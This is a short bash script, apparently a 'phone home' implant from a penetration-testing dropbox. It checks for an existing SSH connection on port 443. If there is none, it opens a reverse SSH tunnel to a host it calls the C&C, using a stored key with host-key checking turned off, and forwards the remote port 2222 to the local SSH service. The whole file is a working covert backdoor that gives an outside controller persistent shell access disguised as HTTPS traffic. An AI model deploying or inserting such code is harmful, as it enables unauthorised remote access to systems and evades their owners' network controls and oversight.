#!/bin/bash

CNC_IP=192.168.0.1

cd /opt/ssh-phone-home

if netstat -antp|grep ":443.\+ESTABLISHED.\+/ssh" ; then 
    echo Connection is UP
else
    echo Connection is DOWN
    
    ## Connect to the C&C ##
    echo Connecting...
    ssh -nNT -i id_rsa dropbox@$CNC_IP -p 443 -o StrictHostKeyChecking=no -R 2222:127.0.0.1:22 &
fi
